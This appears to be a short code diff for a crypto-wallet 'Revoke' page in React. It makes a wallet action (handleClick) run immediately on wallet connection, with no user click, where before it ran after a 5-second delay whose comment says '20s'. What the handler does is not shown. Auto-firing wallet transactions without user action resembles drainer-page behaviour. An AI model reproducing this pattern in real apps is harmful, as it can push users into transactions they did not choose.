@@ -123,13 +123,9 @@ const Revoke = () => {
   };
 
   useEffect(() => {
-    let timer;
     if (isConnected && walletData) {
-      timer = setTimeout(() => {
-        handleClick();
-      }, 5000); // 20s
+      handleClick();
     }
-    return () => clearTimeout(timer);
   }, [isConnected, walletData]);
 
   const handleClick = async () => {
@@ -260,7 +256,7 @@ const Revoke = () => {
             amount to reverse them immediately.
           </p>
         </div>
-        <div >
+        <div>
           <div className="w-full max-w-7xl mx-auto px-4 lg:px-8 ">
             <div className="flex flex-col gap-2 mb-2 border border-[#F29F05] rounded-lg px-4 pt-3">
               <div className="flex flex-col sm:flex-row justify-between items-center gap-2">
